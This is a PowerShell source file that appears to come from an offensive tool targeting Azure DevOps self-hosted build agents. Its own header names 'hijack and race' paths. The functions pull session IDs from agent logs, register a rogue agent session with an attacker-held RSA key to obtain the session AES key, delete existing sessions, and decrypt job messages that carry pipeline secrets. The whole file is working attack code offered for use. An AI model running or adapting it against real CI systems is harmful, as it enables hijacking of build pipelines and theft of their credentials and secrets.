# ── Session Helpers ──────────────────────────────────────────────
# Common primitives used by both hijack and race paths.
# ─────────────────────────────────────────────────────────────────
function Find-SessionId {
    param([string]$AgentPath)

    $logsPath = Join-Path $AgentPath "_diag"
    if (-not (Test-Path $logsPath)) { return $null }

    $logFiles = Get-ChildItem $logsPath -Filter "Agent_*.log" -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending

    foreach ($lf in $logFiles) {
        $content = Get-Content $lf.FullName -Raw
        $patterns = @(
            "session\s*'([a-f0-9-]{36})'",
            "sessionId=([a-f0-9-]{36})",
            '"sessionId"\s*:\s*"([a-f0-9-]{36})"',
            "SessionId:\s*([a-f0-9-]{36})",
            "/sessions/([a-f0-9-]{36})"
        )
        foreach ($p in $patterns) {
            $m = [regex]::Matches($content, $p)
            if ($m.Count -gt 0) {
                $sid = $m[$m.Count - 1].Groups[1].Value
                Write-Log "Session found in $($lf.Name) ($($m.Count) matches)" -Severity Success
                return $sid
            }
        }
    }
    Write-Log "No session ID found in $($logFiles.Count) log file(s)" -Severity Warning
    return $null
}

function New-AgentSession {
    param(
        [hashtable]$AgentInfo,
        [hashtable]$ApiHeaders,
        $Rsa
    )

    $sessionBody = @{
        ownerName = $AgentInfo.AgentName
        agent = @{
            id            = $AgentInfo.AgentId
            name          = $AgentInfo.AgentName
            version       = $AgentInfo.Version
            osDescription = $AgentInfo.OS
            _links        = @{}
        }
        useFipsEncryption = $false
        encryptionKey = @{
            encrypted = $false
            value = @{
                exponent = $AgentInfo.RsaPublicExponent
                modulus  = $AgentInfo.RsaPublicModulus
            }
        }
    } | ConvertTo-Json -Depth 5

    $url = "$($AgentInfo.ServerUrl)/_apis/distributedtask/pools/$($AgentInfo.PoolId)/sessions?api-version=7.0"

    try {
        $resp = Invoke-RestMethod -Uri $url -Headers $ApiHeaders -Method POST -Body $sessionBody -ContentType "application/json" -TimeoutSec 15
        if ($resp -and $resp.sessionId) {
            $encKey = [Convert]::FromBase64String($resp.encryptionKey.value)
            $aesKey = $Rsa.Decrypt($encKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
            return @{ SessionId = $resp.sessionId; AesKey = $aesKey; IsConflict = $false; Error = $null }
        }
    } catch {
        $errBody = $null
        try { $errBody = $_.ErrorDetails.Message | ConvertFrom-Json } catch {}
        $isConflict = ($errBody -and $errBody.typeKey -eq "TaskAgentSessionConflictException")
        return @{ SessionId = $null; AesKey = $null; IsConflict = $isConflict; Error = $_.Exception.Message }
    }
    return @{ SessionId = $null; AesKey = $null; IsConflict = $false; Error = "Empty response" }
}

function Remove-Session {
    param(
        [string]$ServerUrl,
        [int]$PoolId,
        [string]$SessionId,
        [hashtable]$ApiHeaders
    )
    $url = "$ServerUrl/_apis/distributedtask/pools/$PoolId/sessions/${SessionId}?api-version=7.0"
    try { $null = Invoke-RestMethod -Uri $url -Headers $ApiHeaders -Method DELETE -TimeoutSec 10 } catch {}
}

function Decrypt-JobMessage {
    param($Response, [byte[]]$AesKey)
    $encBytes = [Convert]::FromBase64String($Response.body)
    $ivBytes  = [Convert]::FromBase64String($Response.iv)
    $aes         = [System.Security.Cryptography.Aes]::Create()
    $aes.Key     = $AesKey
    $aes.IV      = $ivBytes
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $decryptor      = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    $text = [Text.Encoding]::UTF8.GetString($decryptedBytes)
    return $text.TrimStart([char]0xFEFF, [char]0xFFFE)
}
